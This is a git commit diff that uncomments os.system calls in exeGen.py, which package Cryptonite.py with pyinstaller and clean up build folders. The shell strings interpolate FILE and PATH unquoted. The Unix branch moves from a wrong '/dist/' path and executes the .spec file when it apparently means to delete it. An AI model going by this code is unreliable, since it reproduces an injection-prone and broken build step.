a144aea879fb913fde79022b8151d728b0b350cb
Pranav <pranavcosmos4@gmail.com>
2021-09-02 07:17:07 +0530

    Minor Change: undo comments

--- exeGen.py
+++ exeGen.py
@@ -40,15 +40,15 @@ def generate():
         return
     generate_btn.state(["disabled"])
     generate_btn.config(text = "Generating..")
-    # os.system(f"pyinstaller --onefile --clean --icon=\"icon.ico\" Cryptonite.py --name {FILE}")
-    # if OS == "nt":
-    #     os.system(f"MOVE /Y \"{PATH}\\dist\\{FILE}.exe\" \"{PATH}\" && rmdir /Q /S __pycache__ build dist && del /Q {FILE}.spec")
-    # else:
-    #     os.system(f"mv /dist/{FILE}.exe ./")
-    #     os.system(f"rm -r __pycache__")
-    #     os.system(f"rm -r build")
-    #     os.system(f"rm -r dist")
-    #     os.system(f"{FILE}.spec")
+    os.system(f"pyinstaller --onefile --clean --icon=\"icon.ico\" Cryptonite.py --name {FILE}")
+    if OS == "nt":
+        os.system(f"MOVE /Y \"{PATH}\\dist\\{FILE}.exe\" \"{PATH}\" && rmdir /Q /S __pycache__ build dist && del /Q {FILE}.spec")
+    else:
+        os.system(f"mv /dist/{FILE}.exe ./")
+        os.system(f"rm -r __pycache__")
+        os.system(f"rm -r build")
+        os.system(f"rm -r dist")
+        os.system(f"{FILE}.spec")
     generate_btn.config(text = "Done!")
 
 
